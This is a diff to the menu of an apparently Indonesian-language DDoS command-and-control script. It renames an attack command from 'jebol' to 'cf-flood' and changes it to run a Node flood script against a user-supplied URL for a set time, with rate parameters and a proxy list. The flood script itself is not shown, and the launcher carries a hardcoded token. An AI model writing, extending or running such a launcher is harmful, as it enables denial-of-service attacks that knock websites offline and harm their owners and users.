@@ -732,12 +732,12 @@ def main():
             except Exception as e:
                 print(f"Terjadi kesalahan saat menjalankan perintah: {e}")
                 
-        elif "jebol" in cnc:
+        elif "cf-flood" in cnc:
             try:
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                
-               os.system(f'python3 jebol.py {url} {time}')          
+               os.system(f'node cf-flood.js {url} {time} 100 100 proxies.txt')          
                
                url = f"{url}"
                token = "727e8c2fa5b07c"
@@ -755,8 +755,8 @@ def main():
                Ketik [CLS] untuk membersihkan terminal""")
                           
             except IndexError:
-                print('Penggunaan: jebol <url> <waktu>')
-                print('Contoh: jebol http://example.com 60')
+                print('Penggunaan: cf-flood <url> <waktu>')
+                print('Contoh: cf-flood http://example.com 60')
             except ValueError as ve:
                 print(f"Waktu tidak valid: {ve}")
             except Exception as e:
